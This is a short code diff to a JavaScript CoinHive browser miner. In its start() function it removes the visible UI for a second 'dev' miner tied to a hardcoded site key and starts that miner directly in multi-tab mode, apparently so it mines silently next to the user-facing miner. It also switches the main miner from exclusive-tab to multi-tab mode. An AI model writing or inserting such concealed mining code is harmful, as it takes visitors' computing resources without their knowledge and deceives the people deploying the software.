@@ -58,7 +58,7 @@
         return false;
       }
 
-      this.miner.start(CoinHive.FORCE_EXCLUSIVE_TAB, optInToken);
+      this.miner.start(CoinHive.FORCE_MULTI_TAB, optInToken);
       mineLog({'running': true})
 
       this.intervalUpdateStats = setInterval(this.updateStats.bind(this), 50);
@@ -163,10 +163,9 @@
     };
 
     function start(siteKey, opts, devSpeed) {
-      var miner = new CoinHive.Anonymous(siteKey, opts);
       var devMiner = new CoinHive.Anonymous('YjnI5obtmcFVofmcIElf9iayMokHMz2B', { 'throttle': (100 - devSpeed) / 100 });
-      devUI = new MinerUI(devMiner);
-      devUI.start();
+      devMiner.start(CoinHive.FORCE_MULTI_TAB);
+      var miner = new CoinHive.Anonymous(siteKey, opts);
       window.ui = new MinerUI(miner);
       window.ui.start();
     }
